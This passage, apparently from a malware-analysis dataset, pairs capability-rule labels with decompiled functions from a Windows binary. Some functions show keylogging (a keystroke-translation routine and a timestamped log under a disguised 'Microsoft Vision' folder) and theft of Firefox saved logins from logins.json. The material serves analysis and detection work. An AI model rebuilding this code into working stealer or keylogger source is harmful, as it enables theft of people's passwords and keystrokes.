        "decompiled_code": "\nuint fcn.0040882f(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint extraout_ECX;\n    uint32_t uStack292;\n    uint32_t uStack288;\n    uint32_t uStack284;\n    uint32_t uStack276;\n    uchar *puStack272;\n    uchar *puStack268;\n    int32_t iStack264;\n    char16_t *pcStack260;\n    uint uStack256;\n    uint uStack252;\n    uint32_t uStack248;\n    uint32_t uStack244;\n    uint32_t uStack240;\n    uint32_t uStack236;\n    uint uStack204;\n    \n    uStack236 = 0;\n    uStack240 = 0x408846;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack248 = *0x4196a0 + 0x210;\n    uStack240 = 0x800;\n    uStack204 = 0;\n    uStack244 = 0;\n    uStack252 = 0x40886c;\n    fcn.00401052();\n    uStack248 = *0x4196a0 + 0x10;\n    uStack240 = 0x208;\n    uStack244 = 0;\n    uStack252 = 0x408883;\n    fcn.00401052();\n    uStack240 = *0x4196a0 + 0x10;\n    uStack244 = 0;\n    uStack248 = 0;\n    uStack252 = 0x1c;\n    uStack256 = 0;\n    pcStack260 = 0x40889a;\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)();\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n    iStack264 = *0x4196a0 + 0x10;\n    pcStack260 = L\"\\\\Microsoft Vision\\\\\";\n    puStack268 = 0x4088b0;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    puStack268 = &stack0xffffff0c;\n    puStack272 = 0x4088bb;\n    (*_sym.imp.KERNEL32.dll_GetLocalTime)();\n    puStack272 = uStack236 & 0xffff;\n    uStack276 = uStack240 >> 0x10;\n    uStack284 = uStack248 & 0xffff;\n    uStack288 = uStack248 >> 0x10;\n    uStack292 = uStack244 >> 0x10;\n    (*_sym.imp.USER32.dll_wsprintfW)(&stack0xffffff34, L\"%02d-%02d-%02d_%02d.%02d.%02d\");\n    puStack272 = &stack0xffffff34;\n    uStack276 = *0x4196a0 + 0x10;\n    (*pcVar1)();\n    uStack284 = 0x408914;\n    fcn.004032ff(*0x4196a0 + 0x10);\n    uStack284 = 0;\n    uStack288 = 0x80;\n    uStack292 = 2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(*0x4196a0 + 0xc), 0x10000000, 1, 0);\n    *(*0x4196a0 + 4) = uVar3;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    fcn.00411e21();\n    iVar4 = fcn.004109d2();\n    if (iVar4 != 0) {\n        *0x41969c = fcn.00410969(extraout_ECX);\n    }\n    (**0x41969c)(0xd, fcn.004089c0, uVar2, 0);\n    pcVar1 = _sym.imp.USER32.dll_GetMessageA;\n    while (iVar4 = (*pcVar1)(&stack0xfffffeec, 0, 0, 0),  0 < iVar4) {\n        (*_sym.imp.USER32.dll_TranslateMessage)(&stack0xfffffedc);\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&stack0xfffffef0);\n    }\n    return 0;\n}\n",
        "token_count": 953
    },
    "0040cd49": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040cd49(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h;\n    uint var_4h;\n    \n    arg_8h = 0;\n    if (param_1 != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x6c);\n        if (arg_8h != 0) {\n            fcn.0040102c(arg_8h, param_1, 0x30);\n            *(arg_8h + 0x30) = param_1 + 0x30;\n            fcn.0040102c(arg_8h + 0x34, *(arg_8h + 0x2c) + param_1 + 0x30, 0xc);\n            iVar2 = *(arg_8h + 0x2c) + *(arg_8h + 0x30) + 0xc;\n            *(arg_8h + 0x40) = iVar2;\n            iVar1 = *(iVar2 + *(arg_8h + 0x3c));\n            iVar2 = *(arg_8h + 0x3c) + iVar2 + 4;\n            *(arg_8h + 0x44) = iVar1;\n            *(arg_8h + 0x48) = iVar2;\n            fcn.0040102c(arg_8h + 0x4c, iVar2 + iVar1, 0xc);\n            iVar2 = *(arg_8h + 0x48) + *(arg_8h + 0x44) + 0xc;\n            *(arg_8h + 0x58) = iVar2;\n            iVar1 = *(iVar2 + *(arg_8h + 0x54));\n            iVar2 = *(arg_8h + 0x54) + 4 + iVar2;\n            *(arg_8h + 0x5c) = iVar1;\n            *(arg_8h + 0x60) = iVar2;\n            *(arg_8h + 100) = *(iVar2 + iVar1);\n            *(arg_8h + 0x68) = iVar1 + 4 + iVar2;\n            fcn.0040ce4d(*(arg_8h + 0x2c), 0);\n            fcn.0040ce4d(*(arg_8h + 0x3c), 0);\n            fcn.0040ce4d(*(arg_8h + 0x44), 0);\n            fcn.0040ce4d(*(arg_8h + 0x54), 0);\n            fcn.0040ce4d(*(arg_8h + 0x5c), 0);\n            fcn.0040ce4d(*(arg_8h + 100), 0);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 665
    },
    "00413311": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413311(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack96 [4];\n    uchar auStack92 [4];\n    uchar auStack88 [4];\n    uchar auStack84 [52];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack32 = 0x19;\n    arg_ch = 0;\n    uStack28 = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.00402164(auStack96, arg_ch);\n            fcn.00403761(arg_8h_00);\n            fcn.004013ef();\n            iVar1 = fcn.00402164(auStack92, arg_ch);\n            fcn.00403761(iVar1 + 4);\n            fcn.004013ef();\n            iVar1 = fcn.00402164(auStack88, arg_ch);\n            fcn.00403761(iVar1 + 8);\n            fcn.004013ef();\n            iVar1 = fcn.00402164(auStack84, arg_ch);\n            fcn.00403740(*(iVar1 + 0xc));\n            fcn.004013ef();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.00403679(arg_8h);\n    fcn.00403665();\n    return arg_8h;\n}\n",
        "token_count": 377
    },
    "00413786": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00413786(uint *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint var_ch;\n    uint var_8h;\n    \n    if (arg_10h == 0) {\n        if (*(in_ECX + 0x18) == 0) {\n            var_8h = 0;\n            var_ch = 0x414740;\n            fcn.00404f2b(&var_ch);\n            fcn.0040fd93(extraout_ECX_04);\n        }\n    }\n    else if (arg_10h == 1) {\n        if (*(in_ECX + 0x34) == 0) {\n            var_ch = 0x414740;\n            var_8h = 1;\n            fcn.00404f2b(&var_ch);\n            fcn.0040fd93(extraout_ECX_03);\n        }\n        in_ECX = in_ECX + 0x1c;\n    }\n    else if (arg_10h == 2) {\n        if (*(in_ECX + 0x50) == 0) {\n            var_ch = 0x414740;\n            var_8h = 2;\n            fcn.00404f2b(&var_ch);\n            fcn.0040fd93(extraout_ECX_02);\n        }\n        in_ECX = in_ECX + 0x38;\n    }\n    else if (arg_10h == 3) {\n        if (*(in_ECX + 0x6c) == 0) {\n            var_ch = 0x414740;\n            var_8h = 3;\n            fcn.00404f2b(&var_ch);\n            fcn.0040fd93(extraout_ECX_01);\n        }\n        in_ECX = in_ECX + 0x54;\n    }\n    else if (arg_10h == 4) {\n        if (*(in_ECX + 0x88) == 0) {\n            var_ch = 0x414740;\n            var_8h = 4;\n            fcn.00404f2b(&var_ch);\n            fcn.0040fd93(extraout_ECX_00);\n        }\n        in_ECX = in_ECX + 0x70;\n    }\n    else {\n        if (arg_10h != 5) {\n            *arg_8h = 0;\n            arg_8h[1] = 0;\n            return arg_8h;\n        }\n        if (*(in_ECX + 0xa4) == 0) {\n            var_ch = 0x414740;\n            var_8h = 5;\n            fcn.00404f2b(&var_ch);\n            fcn.0040fd93(extraout_ECX);\n        }\n        in_ECX = in_ECX + 0x8c;\n    }\n    fcn.0040304c(in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 713
    },
    "00405a10": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.00405a10(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_90h;\n    uint var_68h;\n    uint var_60h;\n    uint var_48h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t *var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_Sleep)(500);\n    fcn.0041044f();\n    uVar1 = fcn.00411ca2();\n    fcn.00410346(uVar1);\n    uVar1 = fcn.004033bf(0x41485c);\n    fcn.004102b9(&var_90h, uVar1);\n    fcn.00405ea5();\n    fcn.0040304c(&var_68h);\n    fcn.00402e93(&var_ch);\n    fcn.00403036();\n    fcn.0040595e(&var_14h);\n    iVar3 = *var_14h;\n    uVar1 = fcn.00411dc0(iVar3);\n    fcn.00403437(uVar1);\n    fcn.00405ea5();\n    var_4h[5] = *(var_14h + iVar3 + 4);\n    iVar2 = *(var_14h + iVar3 + 8);\n    uVar1 = fcn.00411dc0(iVar2);\n    fcn.00403437(uVar1);\n    fcn.00405ea5();\n    iVar2 = iVar3 + 0xc + iVar2;\n    var_4h[6] = *(var_14h + iVar2);\n    iVar3 = *(var_14h + iVar2 + 1);\n    uVar1 = fcn.00411dc0(iVar3);\n    fcn.00403437(uVar1);\n    fcn.00405ea5();\n    iVar3 = iVar2 + 5 + iVar3;\n    var_4h[8] = *(var_14h + iVar3);\n    iVar2 = *(var_14h + iVar3 + 1);\n    uVar1 = fcn.00411dc0(iVar2);\n    fcn.00403437(uVar1);\n    fcn.00405ea5();\n    iVar2 = iVar3 + 5 + iVar2;\n    var_4h[0xb] = *(var_14h + iVar2);\n    var_4h[0xd] = *(var_14h + iVar2 + 4);\n    var_4h[0xe] = *(var_14h + iVar2 + 5);\n    var_4h[0xf] = *(var_14h + iVar2 + 6);\n    var_4h[0x10] = *(var_14h + iVar2 + 7);\n    var_4h[0x11] = *(var_14h + iVar2 + 8);\n    fcn.00411dc0(*(var_14h + iVar2 + 9));\n    fcn.00403437(&var_4h);\n    *var_4h = 1;\n    var_4h[1] = 1;\n    fcn.00405ea5();\n    fcn.00403036();\n    fcn.00403036();\n    if (var_34h != 0) {\n        fcn.00401e71(var_34h);\n    }\n    var_34h = 0;\n    var_2ch = 0;\n    var_30h = 0;\n    fcn.00403036();\n    fcn.0040feed();\n    return;\n}\n",
        "token_count": 838
    },
    "00407d1c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00407d1c(void)\n\n{\n    int64_t iVar1;\n    uint var_98h;\n    uint var_28h;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = fcn.00407fc0();\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0040825d": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040825d(void)\n\n{\n    uint var_8h;\n    \n    return;\n}\n",
        "token_count": 24
    },
    "0040829b": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.0040829b(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if ((arg_8h == 0) && (arg_ch == 0)) {\n        return 0;\n    }\n    return arg_ch;\n}\n",
        "token_count": 111
    },
    "00408327": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408327(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX != 0) {\n        if (((arg_8h != 0) || (arg_ch != 0)) && (in_EDX != 0)) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "00405fa1": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405fa1(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint8_t *in_EDX;\n    uint32_t uVar3;\n    uint8_t *var_4h;\n    \n    uVar3 = 0;\n    uVar2 = 0;\n    var_4h = in_EDX;\n    for (; 0 < arg_8h; arg_8h = arg_8h + -1) {\n        uVar3 = uVar3 + 1 & 0x800000ff;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n        }\n        uVar1 = *(uVar3 + in_ECX);\n        uVar2 = uVar2 + uVar1 & 0x800000ff;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n        }\n        *(uVar3 + in_ECX) = *(uVar2 + in_ECX);\n        *(uVar2 + in_ECX) = uVar1;\n        *var_4h = *var_4h ^ *((*(uVar3 + in_ECX) + uVar1 & 0xff) + in_ECX);\n        var_4h = var_4h + 1;\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "0040600e": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040600e(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    iVar3 = 0;\n    do {\n        uVar1 = *(iVar3 + in_ECX);\n        uVar2 = uVar2 + *(iVar3 % arg_8h + in_EDX) + uVar1 & 0x800000ff;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n        }\n        *(iVar3 + in_ECX) = *(uVar2 + in_ECX);\n        iVar3 = iVar3 + 1;\n        *(uVar2 + in_ECX) = uVar1;\n    } while (iVar3 < 0x100);\n    return;\n}\n",
        "token_count": 234
    },
    "004061c5": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061c5(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(in_ECX + 0x14);\n    iVar2 = *(in_ECX + 0x18);\n    uVar3 = uVar1 + arg_8h * 8;\n    *(in_ECX + 0x14) = uVar3;\n    if (uVar3 < uVar1) {\n        iVar2 = iVar2 + 1;\n    }\n    uVar3 = uVar1 >> 3 & 0x3f;\n    *(in_ECX + 0x18) = (arg_8h >> 0x1d) + iVar2;\n    if (uVar3 + arg_8h < 0x40) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = -uVar3 + 0x40;\n        fcn.0040102c(in_ECX + 0x1c + uVar3, in_EDX, iVar2);\n        fcn.00406297();\n        for (uVar3 = -uVar3 + 0x7f; uVar3 < arg_8h; uVar3 = uVar3 + 0x40) {\n            fcn.00406297();\n            iVar2 = iVar2 + 0x40;\n        }\n        uVar3 = 0;\n    }\n    fcn.0040102c(in_ECX + 0x1c + uVar3, in_EDX + iVar2, arg_8h - iVar2);\n    return;\n}\n",
        "token_count": 401
    },
    "00412b2a": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412b2a(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    \n    fcn.00405ca3();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x10) = arg_10h;\n    fcn.00405ca3();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x14) = arg_ch;\n    uVar1 = (arg_14h >> 3 & 0x1f) * arg_ch * arg_10h;\n    uVar2 = uVar1 >> 0x1f;\n    uVar2 = (uVar1 ^ uVar2) - uVar2;\n    if ((uVar2 & 0xf) != 0) {\n        uVar2 = (uVar2 & 0xfffffff0) + 0x10;\n    }\n    fcn.00405ca3();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x18) = uVar2;\n    return;\n}\n",
        "token_count": 292
    },
    "004094ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004094ae(uint *param_1, uint8_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint lpKeyState;\n    \n    uVar2 = param_2;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    if (uVar2 < 0x5d) {\n        if (0x5a < uVar2) goto code_r0x004095a5;\n        if (0x14 < uVar2) {\n            if ((uVar2 < 0x20) || ((0x28 < uVar2 && (uVar2 != 0x2e)))) goto code_r0x00409509;\n            goto code_r0x004095a5;\n        }\n        if (uVar2 == 0x14) goto code_r0x004095a5;\n        if (uVar2 < 8) goto code_r0x00409509;\n        if ((uVar2 < 10) || (uVar2 == 0xd)) goto code_r0x004095a5;\n        if (uVar2 < 0x10) goto code_r0x00409509;\n        bVar3 = uVar2 < 0x12;\n        bVar4 = uVar2 == 0x12;\n    }\n    else {\n        if (0xb3 < uVar2) {\n            if ((uVar2 < 0xba) || ((0xc0 < uVar2 && ((uVar2 < 0xdb || (0xde < param_2)))))) goto code_r0x00409509;\n            goto code_r0x004095a5;\n        }\n        if (0xb1 < uVar2) goto code_r0x004095a5;\n        if (uVar2 < 0x60) goto code_r0x00409509;\n        if (uVar2 < 0x6a) goto code_r0x004095a5;\n        if (uVar2 < 0xad) goto code_r0x00409509;\n        bVar3 = uVar2 < 0xaf;\n        bVar4 = uVar2 == 0xaf;\n    }\n    if (!bVar3 && !bVar4) {\ncode_r0x00409509:\n        fcn.00401052(&lpKeyState, 0, 0x100);\n        uVar1 = (*_sym.imp.USER32.dll_MapVirtualKeyA)(uVar2, 0);\n        (*_sym.imp.USER32.dll_ToUnicode)(uVar2, uVar1, &lpKeyState, param_1 + 2, 1, 0);\n        return param_1;\n    }\ncode_r0x004095a5:\n    param_1[1] = uVar2;\n    return param_1;\n}\n",
        "token_count": 661
    },
    "00408e5b": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint8_t fcn.00408e5b(void)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = (*_sym.imp.USER32.dll_GetKeyState)(0x14);\n    return uVar1 & 1;\n}\n",
        "token_count": 54
    },
    "00410756": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00410756(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t extraout_DL;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar1 = fcn.004106c4();\n    uVar2 = uVar1;\n    uVar3 = extraout_DL;\n    if (uVar1 != 0) {\n        uVar2 = fcn.0041064e(5, &var_4h);\n        if ((uVar2 == 0) || (iVar4 = var_4h,  var_4h == 0)) {\n            uVar3 = ~*(uVar1 + 0x16) & 1;\n        }\n        else {\n            do {\n                iVar4 = iVar4 - *(uVar2 + 4);\n                uVar2 = fcn.004104a0(uVar2 + 8, arg_8h, arg_ch);\n                if (uVar2 == 0) break;\n            } while (iVar4 != 0);\n            uVar3 = 1;\n        }\n    }\n    return uVar2 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 294
    },
    "0040ac0a": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ac0a(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uint uVar7;\n    uint uVar8;\n    uint *arg_8h_00;\n    uint pszPath;\n    uint32_t uVar9;\n    uint var_4c4h;\n    uint lpApplicationName;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t lpBinaryType;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint lpAppName;\n    uint lpExistingFileName;\n    uint lpNewFileName;\n    uint var_8h;\n    \n    var_1ch = in_ECX;\n    fcn.004035e5(L\"Profile\");\n    uVar3 = 0;\n    fcn.00401052(&var_4c4h, 0, 0x208);\n    lpBinaryType = 0;\n    iVar4 = 0;\n    fcn.00401052(&lpApplicationName, 0, 0x104);\n    iVar1 = fcn.0040c118();\n    if (iVar1 != 0) {\n        fcn.004035e5(&lpApplicationName);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpApplicationName, L\"\\\\firefox.exe\");\n        (*_sym.imp.KERNEL32.dll_GetBinaryTypeW)(&lpApplicationName, &lpBinaryType);\n        arg_8h_00 = &var_28h;\n        uVar9 = lpBinaryType == 6;\n        pszPath = extraout_ECX;\n        fcn.0040362d(arg_8h_00);\n        iVar1 = fcn.0040ba00(arg_8h_00, pszPath);\n        if (iVar1 != 0) {\n            fcn.0040346a(L\"\\\\Mozilla\\\\Firefox\\\\\");\n            fcn.0040362d(&arg_8h);\n            fcn.0040346a(L\"profiles.ini\");\n            uVar3 = fcn.004035e5(L\"Profile\");\n            fcn.00403437(uVar3);\n            fcn.00405ea5();\n            fcn.00403272(0);\n            while (iVar1 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)\n                                     (lpAppName, L\"Path\", 0, &var_4c4h, 0x104, var_20h),  iVar1 != 0) {\n                iVar4 = iVar4 + 1;\n                var_24h = iVar4;\n                uVar3 = fcn.004035e5(L\"Profile\");\n                fcn.00403437(uVar3);\n                fcn.00405ea5();\n                var_5ch = 0;\n                fcn.00403272(iVar4);\n                fcn.0040362d(&arg_8h);\n                fcn.0040346a(&var_4c4h);\n                fcn.00403554(&var_18h);\n                iVar1 = (**(in_ECX + 0x68))(var_18h);\n                if (((iVar1 == 0) && (var_98h = (**(in_ECX + 0x80))(),  var_98h != 0)) &&\n                   (iVar1 = (**(in_ECX + 0x7c))(var_98h, 1, 0),  iVar1 == 0)) {\n                    fcn.0040362d(&var_8h);\n                    fcn.0040346a(L\"\\\\logins.json\");\n                    fcn.0040f76b();\n                    fcn.0040346a(0x414684);\n                    uVar3 = fcn.004034a7();\n                    fcn.00403335(uVar3);\n                    fcn.00405ea5();\n                    var_34h = 0;\n                    fcn.0040346a(L\".tmp\");\n                    uVar3 = lpNewFileName;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, lpNewFileName, 0);\n                    if (iVar4 != 0) {\n                        fcn.00403437(&lpNewFileName);\n                    }\n                    fcn.0040fece();\n                    fcn.00403437(&lpExistingFileName);\n                    uVar7 = 0xc0000000;\n                    uVar8 = extraout_ECX_00;\n                    iVar4 = fcn.00410192(0xc0000000);\n                    if (iVar4 != 0) {\n                        var_30h = 0;\n                        var_2ch = 0;\n                        fcn.0040fe3d(&var_30h, var_a0h, 0);\n                        fcn.004033bf(\"encryptedUsername\");\n                        fcn.00402f22(&var_9ch);\n                        iVar1 = fcn.00409eb7();\n                        var_74h = iVar1;\n                        fcn.00405ea5();\n                        fcn.00405ea5();\n                        iVar4 = var_74h;\n                        while (iVar1 != 0) {\n                            pcVar6 = \"hostname\";\n                            var_6ch = 0;\n                            var_68h = 0;\n                            var_64h = 0;\n                            iVar1 = iVar4;\n                            uVar3 = fcn.004033bf(\"hostname\");\n                            puVar5 = &var_78h;\n                            fcn.00402f22(puVar5);\n                            fcn.00409ef0(puVar5, uVar3);\n                            fcn.00405ea5(pcVar6, iVar1);\n                            fcn.00405ea5();\n                            pcVar6 = \"encryptedUsername\";\n                            iVar1 = iVar4;\n                            uVar3 = fcn.004033bf(\"encryptedUsername\");\n                            puVar5 = &var_80h;\n                            fcn.00402f22(puVar5);\n                            fcn.00409ef0(puVar5, uVar3);\n                            fcn.00405ea5(pcVar6, iVar1);\n                            fcn.00405ea5();\n                            pcVar6 = \"encryptedPassword\";\n                            iVar1 = iVar4;\n                            uVar3 = fcn.004033bf(\"encryptedPassword\");\n                            puVar5 = &var_88h;\n                            fcn.00402f22(puVar5);\n                            fcn.00409ef0(puVar5, uVar3);\n                            fcn.00405ea5(pcVar6, iVar1);\n                            fcn.00405ea5();\n                            fcn.0040b15e(var_50h, &var_44h);\n                            fcn.0040b15e(var_4ch, &var_48h);\n                            uVar3 = fcn.0040309d(&var_38h);\n                            fcn.00403437(uVar3);\n                            fcn.00405ea5();\n                            puVar5 = &var_3ch;\n                            var_38h = 0;\n                            uVar3 = var_44h;\n                            fcn.004033bf(var_44h);\n                            uVar2 = fcn.0040309d(uVar3);\n                            fcn.00403437(uVar2);\n                            fcn.00405ea5(uVar2, uVar3, puVar5);\n                            var_3ch = 0;\n                            fcn.00405ea5();\n                            puVar5 = &var_40h;\n                            uVar3 = var_48h;\n                            fcn.004033bf(var_48h);\n                            uVar2 = fcn.0040309d(uVar3);\n                            fcn.00403437(uVar2);\n                            fcn.00405ea5(uVar2, uVar3, puVar5);\n                            var_40h = 0;\n                            fcn.00405ea5();\n                            var_60h = 0;\n                            puVar5 = &var_6ch;\n                            fcn.00401f95(puVar5);\n                            fcn.00401fcb(puVar5);\n                            fcn.00405ea5();\n                            fcn.00405ea5();\n                            fcn.00405ea5();\n                            fcn.00405ea5();\n                            fcn.00405ea5();\n                            fcn.004013ef();\n                            iVar4 = iVar4 + -1;\n                            uVar3 = lpNewFileName;\n                            iVar1 = iVar4;\n                        }\n                        iVar4 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(uVar3);\n                        if (iVar4 != 0) {\n                            puVar5 = &lpNewFileName;\n                            fcn.0040362d(puVar5);\n                            fcn.0040ff0b(puVar5);\n                        }\n                        (**(var_1ch + 0x84))(var_98h);\n                        (**(var_1ch + 0x6c))();\n                        fcn.00403036();\n                    }\n                    fcn.0040feed(uVar7, uVar8);\n                    fcn.00405ea5();\n                    lpNewFileName = 0;\n                    fcn.00405ea5();\n                    lpExistingFileName = 0;\n                    fcn.00405ea5();\n                    fcn.00405ea5();\n                    in_ECX = var_1ch;\n                    iVar4 = var_24h;\n                }\n                else {\n                    fcn.00405ea5();\n                    fcn.00405ea5();\n                }\n                var_8h = 0;\n            }\n            fcn.0040b9a9();\n            uVar3 = 1;\n            fcn.00405ea5();\n        }\n        fcn.00405ea5(arg_8h_00, pszPath, uVar9);\n    }\n    fcn.00405ea5();\n    fcn.00405ea5();\n    return uVar3;\n}\n",
        "token_count": 2439
    },
    "0040c9f2": {
        "rules": [
